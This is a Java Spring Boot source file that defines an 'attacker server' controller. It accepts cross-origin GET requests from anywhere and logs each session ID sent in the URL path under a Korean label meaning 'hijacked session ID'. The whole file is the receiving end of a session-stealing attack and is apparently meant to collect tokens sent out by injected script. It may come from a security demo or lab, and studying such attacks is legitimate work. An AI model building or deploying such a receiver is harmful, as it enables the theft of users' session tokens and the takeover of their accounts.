package com.smt.attacker_sever.smt;

import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RestController;

@RestController
@CrossOrigin(origins = "*")
public class AttackerServerController {
    @GetMapping("/{session_id}")
    public void getSessionId(@PathVariable("session_id") String sessionId){
        System.out.println("[탈취한 세션 아이디] : "+sessionId);
    }

}
